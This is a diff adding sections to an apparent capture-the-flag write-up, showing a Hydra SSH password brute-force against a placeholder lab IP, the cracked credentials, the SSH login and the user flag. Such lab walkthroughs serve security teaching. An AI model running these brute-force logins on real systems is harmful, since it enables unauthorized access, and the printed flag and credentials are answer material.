@@ -130,7 +130,27 @@ We have a username (```meliodas```) and we know the password can be found in the
 
 ## Hydra
 
+The only piece of the credentials we have is the username, so we'll have to bruteforce the password with ```Hydra```.
 
+The syntax for bruteforcing ```SSH``` with a known username and unknown password is ```hydra -l <username> -P <wordlist> <IP_Address> ssh```.
+
+```
+$ hydra -l meliodas -P /path/to/word/list <IP_Address> ssh
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://<IP_Address>:22/
+[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344222 to do in 1350:41h, 16 active
+[22][ssh] host: <IP_Address>   login: meliodas   password: iloveyou1
+1 of 1 target successfully completed, 1 valid password found
+```
+
+After a couple minutes we'll get a hit.
+
+```
+[22][ssh] host: <IP_Address>   login: meliodas   password: iloveyou1
+```
+
+Credentials - ```meliodas:iloveyou1```
 
 [Back To Top](#library "Jump To Top")
 
@@ -138,7 +158,47 @@ We have a username (```meliodas```) and we know the password can be found in the
 
 ## Initial Access
 
+Finally, we can log in and look for the first flag.
 
+```
+$ ssh meliodas@<IP_Address>
+
+meliodas@<IP_Address>'s password: iloveyou1
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+meliodas@ubuntu:~$
+```
+
+After logging in, we'll be dumped into the home directory of ```meliodas```, and if we list all contents of the current directory we'll see the ```user.txt``` file.
+
+```
+meliodas@ubuntu:~$ ls -la
+
+total 40
+drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
+drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
+-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
+-rw------- 1 root     root       44 Aug 23  2019 .bash_history
+-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
+-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
+drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
+drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
+-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
+-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
+-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
+```
+
+If we ```cat``` the ```user.txt``` file we'll find our first flag.
+
+```
+meliodas@ubuntu:~$ cat user.txt
+
+6d488cbb3f111d135722c33cb635f4ec
+```
 
 [Back To Top](#library "Jump To Top")
 
